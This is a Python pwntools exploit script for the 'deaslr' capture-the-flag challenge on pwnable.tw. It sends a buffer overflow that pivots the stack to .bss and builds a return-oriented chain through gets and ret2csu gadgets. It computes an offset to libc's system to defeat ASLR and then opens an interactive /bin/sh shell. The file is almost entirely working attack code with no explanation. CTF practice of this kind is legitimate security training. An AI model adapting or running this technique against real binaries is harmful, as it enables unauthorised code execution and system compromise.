#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys
import time

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./deaslr_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x400554
				b*0x4005ba
				b*system
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10402)

	return s

s = conn()

elf = ELF('deaslr')
libc = ELF('libc_64.so.6')

pop_rdi = 0x4005c3
bss = 0x601000
pop_6 = 0x4005ba
ret = 0x4003f9
leave_ret = 0x400554
call_ret2csu = 0x4005A0
add_rbp_0x48 = 0x4004f8
offset = libc.symbols['system'] - (libc.symbols['__GI__IO_getline_info'] + 292)

payload = b'A' * 0x10 + p64(bss + 0x200)
payload += p64(pop_rdi) + p64(bss + 0x200)
payload += p64(elf.symbols['gets']) + p64(leave_ret)

s.sendline(payload)

payload = b'A' * 8 + p64(pop_rdi) + p64(bss + 0x500)
payload += p64(elf.symbols['gets']) + p64(pop_6)
payload += p64(0) + p64(1) + p64(bss + 0x258)
payload += p64(offset, sign='signed') + p64(0) * 2
payload += p64(ret) + p64(call_ret2csu) + p64(0) * 2
payload += p64(bss + 0x158) + p64(0) * 4
payload += p64(add_rbp_0x48) + p64(0)
payload += p64(pop_6) + p64(0) * 2 + p64(bss + 0x1a0)
payload += p64(0) * 2 + p64(bss + 0x500)
payload += p64(call_ret2csu)

s.sendline(payload)

s.sendline(b'/bin/sh')

s.interactive()
